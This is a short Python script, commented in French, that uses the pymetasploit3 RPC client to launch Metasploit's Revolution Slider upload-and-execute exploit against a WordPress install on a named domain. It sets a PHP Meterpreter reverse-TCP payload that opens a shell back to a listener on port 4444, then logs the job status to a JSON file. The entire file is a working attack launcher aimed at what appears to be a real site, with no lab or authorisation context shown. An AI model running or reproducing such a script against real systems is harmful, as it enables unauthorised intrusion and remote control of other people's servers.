from pymetasploit3.msfrpc import MsfRpcClient
import json
import datetime
import os

# Connexion RPC
client = MsfRpcClient(password='test', port=55553, ssl=False)

exploit = client.modules.use('exploit', 'unix/webapp/wp_revslider_upload_execute')
exploit['RHOSTS'] = 'kanickai.com'
exploit['TARGETURI'] = '/wordpress'
exploit['LHOST'] = '192.168.1.100'  # Remplace par ton IP
exploit['LPORT'] = 4444
exploit['PAYLOAD'] = 'php/meterpreter/reverse_tcp'

job_id = exploit.execute()

results = {
    "exploit": exploit.name,
    "target": exploit['RHOSTS'],
    "status": "launched" if job_id else "failed",
    "job_id": job_id
}

timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
filename = f"/msf/results/metasploit_result_{timestamp}.json"

with open(filename, "w") as f:
    json.dump(results, f, indent=2)

print(f"✅ Résultat enregistré dans : {filename}")
